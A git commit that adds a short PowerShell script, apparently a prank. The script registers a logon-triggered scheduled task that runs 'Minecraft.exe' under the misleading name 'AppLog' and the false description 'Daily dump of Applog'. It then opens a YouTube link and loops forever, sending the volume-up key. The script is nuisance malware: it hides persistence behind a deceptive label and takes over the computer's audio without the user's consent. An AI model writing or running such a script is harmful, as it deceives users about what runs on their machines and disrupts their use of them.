45cf8b43761ed45187a7092a84f7b92c9b137ceb
freidet <81165292+freidet@users.noreply.github.com>
2021-04-13 08:19:23 -0400

    Add files via upload

---
+++ Untitled2.ps1
@@ -0,0 +1,15 @@
+﻿$action = New-ScheduledTaskAction -Execute 'Minecraft.exe' `
+
+  -Argument '-Path C:\Desktop\Minecraft.exe'
+
+$trigger =  New-ScheduledTaskTrigger -ONLOGON
+
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AppLog" -Description "Daily dump of Applog"
+
+
+Start-Process "https://youtu.be/gQfFOPFLo0U?t=11893"
+while($true)
+{
+    $obj = new-object -com wscript.shell 
+    $obj.SendKeys([char]175)
+}
